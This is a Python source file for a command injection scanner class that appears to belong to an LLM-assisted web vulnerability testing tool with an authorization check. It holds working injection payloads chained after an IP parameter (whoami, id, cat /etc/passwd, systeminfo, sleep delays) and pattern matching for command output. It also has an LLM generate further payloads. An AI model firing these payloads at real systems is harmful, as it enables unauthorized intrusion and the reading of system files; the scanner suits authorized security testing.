# scanners/cmdi_scanner.py
import requests
import time
from bs4 import BeautifulSoup
from llm.payload_generator import LLMPayloadGenerator
from core.authorization import AuthorizationChecker

class CMDiScanner:
    """LLM-powered Command Injection vulnerability scanner"""

    def __init__(self, target_url, session=None):
        self.target_url = target_url
        self.session = session or requests.Session()
        self.payload_gen = LLMPayloadGenerator()
        self.auth = AuthorizationChecker()
        self.findings = []

        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Security Scanner - Authorized Testing)"
        })

        # Linux output patterns
        self.linux_patterns = [
            "root:", "daemon:", "bin:", "sys:",
            "uid=", "gid=", "groups=",
            "linux", "ubuntu", "kali", "debian",
            "/bin/bash", "/bin/sh",
        ]

        # Windows output patterns
        self.windows_patterns = [
            "windows", "microsoft", "volume serial",
            "directory of", "system32", "systemroot",
            "nt authority", "administrator",
            "volume in drive", "c:\\", "c:/",
            "program files", "users\\",
        ]

    def get_fresh_token(self, url):
        """Fetch fresh CSRF token"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, "html.parser")
            token_input = soup.find("input", {"name": "user_token"})
            if token_input:
                return token_input["value"]
        except Exception as e:
            print(f"[CMDi] Error fetching token: {e}")
        return ""

    def submit_payload(self, url, param_name, payload):
        """Submit payload with fresh CSRF token"""
        try:
            token = self.get_fresh_token(url)
            data = {
                param_name: payload,
                "Submit": "Submit",
                "user_token": token
            }
            response = self.session.post(url, data=data, timeout=15)
            return response
        except Exception as e:
            print(f"[CMDi] Error submitting payload: {e}")
            return None

    def check_command_output(self, response):
        """Check if response contains OS command output"""
        if not response:
            return False, None
        text = response.text.lower()
        for pattern in self.linux_patterns + self.windows_patterns:
            if pattern in text:
                return True, pattern
        return False, None

    def check_time_based(self, url, param_name):
        """Time-based blind command injection"""
        payloads = [
            "127.0.0.1; sleep 3",
            "127.0.0.1 && sleep 3",
            "127.0.0.1 | sleep 3",
            "127.0.0.1 & ping -n 4 127.0.0.1",   # Windows ping delay
            "127.0.0.1; ping -c 3 127.0.0.1",     # Linux ping delay
        ]
        for payload in payloads:
            try:
                token = self.get_fresh_token(url)
                start = time.time()
                self.session.post(url, data={
                    param_name: payload,
                    "Submit": "Submit",
                    "user_token": token
                }, timeout=15)
                elapsed = time.time() - start
                if elapsed >= 3:
                    return True, payload, round(elapsed, 2)
            except Exception:
                continue
        return False, None, 0

    def scan(self):
        """Main CMDi scan method"""

        if not self.auth.check_authorization(self.target_url):
            print("[CMDi] ❌ Scan aborted - Target not authorized!")
            return []

        print(f"\n[CMDi] 🔍 Starting Command Injection scan on: {self.target_url}")

        # Generate LLM payloads
        print("[CMDi] Generating CMDi payloads using LLM...")
        llm_payloads = self.payload_gen.generate_cmdi_payloads(
            os_type="Windows",
            param_name="ip"
        )

        # Static payloads — both Linux AND Windows
        static_payloads = [
            # Linux payloads
            ("ip", "127.0.0.1; whoami"),
            ("ip", "127.0.0.1 && whoami"),
            ("ip", "127.0.0.1 | whoami"),
            ("ip", "127.0.0.1; id"),
            ("ip", "127.0.0.1 | id"),
            ("ip", "127.0.0.1; uname -a"),
            ("ip", "127.0.0.1; cat /etc/passwd"),
            # Windows payloads
            ("ip", "127.0.0.1 & whoami"),
            ("ip", "127.0.0.1 && whoami"),
            ("ip", "127.0.0.1 | whoami"),
            ("ip", "127.0.0.1 & dir"),
            ("ip", "127.0.0.1 & systeminfo"),
            ("ip", "127.0.0.1 & type C:\\Windows\\System32\\drivers\\etc\\hosts"),
        ]

        # Add LLM payloads
        for p in llm_payloads:
            if isinstance(p, dict):
                static_payloads.append(("ip", p.get("payload", "")))

        print(f"[CMDi] Testing {len(static_payloads)} payloads (Linux + Windows)...")

        # --- Test 1: Direct command output detection ---
        print("\n[CMDi] --- Testing Direct Command Injection ---")
        for param, payload in static_payloads:
            if not payload:
                continue

            response = self.submit_payload(self.target_url, param, payload)
            vulnerable, pattern = self.check_command_output(response)

            if vulnerable:
                finding = {
                    "type": "Command Injection - Direct",
                    "url": self.target_url,
                    "parameter": param,
                    "payload": payload,
                    "severity": "Critical",
                    "evidence": f"Command output pattern detected: '{pattern}'"
                }
                self.findings.append(finding)
                print(f"[CMDi] ✅ VULNERABLE (Direct)! Payload: {payload}")
                print(f"[CMDi] Evidence: '{pattern}' found in response")
                break
        else:
            print("[CMDi] No direct command injection detected")

        # --- Test 2: Time-based blind detection ---
        print("\n[CMDi] --- Testing Time-Based Blind Command Injection ---")
        print("[CMDi] This test takes ~3 seconds...")
        vulnerable, payload, elapsed = self.check_time_based(self.target_url, "ip")
        if vulnerable:
            finding = {
                "type": "Command Injection - Time Based Blind",
                "url": self.target_url,
                "parameter": "ip",
                "payload": payload,
                "severity": "Critical",
                "evidence": f"Response delayed by {elapsed}s — sleep/ping command executed"
            }
            self.findings.append(finding)
            print(f"[CMDi] ✅ VULNERABLE (Time-Based)! Response took: {elapsed}s")
        else:
            print("[CMDi] No time-based injection detected")

        print(f"\n[CMDi] Scan complete. Found {len(self.findings)} vulnerability/vulnerabilities.")
        return self.findings
